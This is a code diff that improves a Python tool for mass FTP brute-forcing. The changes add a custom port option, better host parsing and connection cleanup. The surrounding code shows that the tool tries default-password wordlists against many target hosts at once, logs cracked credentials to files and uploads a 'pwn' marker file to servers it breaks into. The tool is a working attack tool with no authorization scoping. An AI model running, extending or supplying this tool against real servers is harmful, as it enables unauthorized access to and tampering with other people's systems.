@@ -11,6 +11,7 @@ import argparse
 import asyncio
 import ftplib
 import sys
+import urllib.parse
 from dataclasses import dataclass
 from pathlib import Path
 from typing import Iterable
@@ -24,6 +25,7 @@ console = Console()
 DEFAULT_WORDLIST = Path("ftp-betterdefaultpasslist.txt")
 DEFAULT_CONCURRENCY = 50
 DEFAULT_TIMEOUT = 15
+DEFAULT_PORT = 21
 PWN_FILE = Path("pwn.txt")
 
 
@@ -48,7 +50,11 @@ class BruteResult:
 def parse_host(hostname: str) -> str:
     hostname = hostname.strip()
     if "://" in hostname:
-        hostname = hostname.split("/")[2]
+        hostname = urllib.parse.urlsplit(hostname).hostname or hostname
+    else:
+        hostname = hostname.rstrip("/")
+    if hostname.startswith("[") and "]" in hostname:
+        return hostname[1 : hostname.index("]")]
     if ":" in hostname:
         hostname = hostname.split(":")[0]
     return hostname.rstrip("/")
@@ -85,22 +91,31 @@ class FtpBruteForcer:
         wordlist: list[Credential],
         concurrency: int = DEFAULT_CONCURRENCY,
         timeout: int = DEFAULT_TIMEOUT,
+        port: int = DEFAULT_PORT,
         pwn_file: Path = PWN_FILE,
         output_dir: Path = Path("."),
     ) -> None:
         self.wordlist = wordlist
         self.concurrency = concurrency
         self.timeout = timeout
+        self.port = port
         self.pwn_file = pwn_file
         self.output_dir = output_dir
         self._results: list[BruteResult] = []
 
     def _attempt_login(self, host: str, cred: Credential) -> tuple[bool, ftplib.FTP | None]:
+        conn = None
         try:
-            conn = ftplib.FTP(host, timeout=self.timeout)
+            conn = ftplib.FTP()
+            conn.connect(host, self.port, timeout=self.timeout)
             conn.login(cred.username, cred.password)
             return True, conn
         except ftplib.all_errors:
+            if conn is not None:
+                try:
+                    conn.close()
+                except ftplib.all_errors:
+                    pass
             return False, None
 
     def _upload_pwn(self, conn: ftplib.FTP) -> bool:
@@ -117,7 +132,7 @@ class FtpBruteForcer:
         for cred in self.wordlist:
             success, conn = await asyncio.to_thread(self._attempt_login, host, cred)
             if success and conn:
-                ftp_format = f"ftp://{cred.username}:{cred.password}@{host}:21"
+                ftp_format = f"ftp://{cred.username}:{cred.password}@{host}:{self.port}"
                 console.print(f"[green]✔[/green] Login Success: {host} {cred.username}:{cred.password}")
 
                 self._save(self.output_dir / "ftp-creds.txt", ftp_format)
@@ -127,7 +142,10 @@ class FtpBruteForcer:
                     self._save(self.output_dir / "ftp-pwned.txt", ftp_format)
                     console.print(f"[yellow]⚠[/yellow] PWN file uploaded to {host}")
 
-                await asyncio.to_thread(conn.quit)
+                try:
+                    await asyncio.to_thread(conn.quit)
+                except ftplib.all_errors:
+                    pass
                 return BruteResult(host, cred, pwned)
 
             console.print(f"[red]✘[/red] Login Failed: {host} {cred.username}:{cred.password}", end="\r")
@@ -150,19 +168,17 @@ class FtpBruteForcer:
             async with semaphore:
                 return await self._brute_host(host)
 
+        target_list = list(targets)
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             console=console,
             transient=True,
         ) as progress:
-            task_id = progress.add_task(
-                f"[cyan]Brute-forcing {len(list(targets))} host(s)...",
+            progress.add_task(
+                f"[cyan]Brute-forcing {len(target_list)} host(s)...",
                 total=None,
             )
-            # Re-materialize targets for the gather
-            target_list = list(targets)
-            progress.update(task_id, description=f"[cyan]Brute-forcing {len(target_list)} host(s)...")
             self._results = await asyncio.gather(*[bounded_brute(h) for h in target_list])
 
         self._render_results()
@@ -203,12 +219,13 @@ def build_parser() -> argparse.ArgumentParser:
         epilog="""
 examples:
   %(prog)s -t targets.txt
-  %(prog)s -t targets.txt -w wordlist.txt -c 100 -o results/
+  %(prog)s -t targets.txt -w wordlist.txt -c 100 -p 2121 -o results/
         """,
     )
     parser.add_argument("-t", "--targets", required=True, help="File containing target hosts/URLs")
     parser.add_argument("-w", "--wordlist", type=Path, default=DEFAULT_WORDLIST, help="Credential wordlist")
     parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Max concurrent connections")
+    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="FTP port (default: 21)")
     parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="FTP connection timeout")
     parser.add_argument("-o", "--output", type=Path, default=Path("."), help="Output directory")
     return parser
@@ -233,6 +250,7 @@ def main() -> None:
         wordlist=wordlist,
         concurrency=args.concurrency,
         timeout=args.timeout,
+        port=args.port,
         output_dir=args.output,
     )
     try:
